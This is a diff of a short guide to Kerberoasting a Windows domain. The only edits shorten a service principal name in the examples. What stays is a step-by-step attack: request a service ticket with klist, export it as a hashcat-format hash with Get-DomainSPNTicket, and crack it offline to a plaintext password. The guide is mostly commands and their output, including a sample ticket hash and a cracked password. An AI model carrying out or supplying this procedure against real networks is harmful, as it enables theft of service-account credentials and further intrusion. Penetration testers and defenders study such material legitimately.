@@ -9,13 +9,13 @@ Short guide by Ville Koch (27.07.2018)
 4) To get the Kerberos Ticket, open cmd.exe --> "klist get <SPN>" (SPN obtained in step 3)
 
 	Example:
-	C:\>klist get HTTP/SA-PF00-F5-SPS
+	C:\>klist get HTTP/SA-SPS
 	Current LogonId is 0:0x29ca8e9
-	A ticket to HTTP/SA-PF00-F5-SPS has been retrieved successfully.
+	A ticket to HTTP/SA-SPS has been retrieved successfully.
 
 	Cached Tickets: (4)
 	#1> Client: domainuser @ CONTOSO.NET
-        Server: HTTP/SA-PF00-F5-SPS @ CONTOSO.NET
+        Server: HTTP/SA-SPS @ CONTOSO.NET
         KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
         Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
         Start Time: 7/27/2018 14:56:45 (local)
@@ -30,11 +30,11 @@ Short guide by Ville Koch (27.07.2018)
    Command: Get-DomainSPNTicket -SPN "<SPN>" -OutputFormat Hashcat
    
    Example:
-   PS U:\> Get-DomainSPNTicket -SPN "HTTP/SA-PF00-F5-SPS" -OutputFormat Hashcat
+   PS U:\> Get-DomainSPNTicket -SPN "HTTP/SA-SPS" -OutputFormat Hashcat
 
 
 	TicketByteHexStream  : 
-	Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$HTTP/SA-PF00-F5-SPS*$A4CBB9C21C71FFB4B59C8FD02B839034$B1930229B020660CFFC3168314E56BA04E8064F163376C985E3F83205B80712CCED93E963E544A0EE090B988F0587E5A1AA
+	Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$HTTP/SA-SPS*$A4CBB9C21C71FFB4B59C8FD02B839034$B1930229B020660CFFC3168314E56BA04E8064F163376C985E3F83205B80712CCED93E963E544A0EE090B988F0587E5A1AA
 						   BBAA9D56EF5A21C8D59205908AF7F5874377ECFB729AD59EA19014A8C7BEBC3989D585D0CDE86155A6B5AB3F36DCCD24D63BB2488F7C83DEAF6464C171D28A7585D20967EE6745342BCCEA17902D0A669
 						   F19AF4AFF1D1044BB4E870E11D8AE686114AE955810091763AA9694E683BA927B52FAD09D02BF2A3C9638A53FBBE905037026FB58579123D9694CCEBD553F47F765EB339DEB5D6CFF51B47EDE100CBABD
 						   BD1D072593F9088D4407.............................................2FB96E9EAEBD8807C77B38065D0C8282907B00046A925B0E9F94ECF0579344848CCD453683BA1C9CE8ACCE85E9DDEE69
@@ -44,7 +44,7 @@ Short guide by Ville Koch (27.07.2018)
 						   8FCF84B7BB27BF4532E750E499
 	SamAccountName       : UNKNOWN
 	DistinguishedName    : UNKNOWN
-	ServicePrincipalName : HTTP/SA-PF00-F5-SPS
+	ServicePrincipalName : HTTP/SA-SPS
    
    (Example hash was reduced from original, is usually longer)
    
@@ -82,4 +82,4 @@ Short guide by Ville Koch (27.07.2018)
 	
 7) Now you have (if it worked and the password was not too complex ;) ) the password in plaintext:
 	root@kali:~# cat crackedpw.txt 
-	$krb5tgs$23$*UNKNOWN$UNKNOWN$HTTP/SA-PF00-F5-SPS*$255649a...2:P@ssw0rd
+	$krb5tgs$23$*UNKNOWN$UNKNOWN$HTTP/SA-SPS*$255649a...2:P@ssw0rd
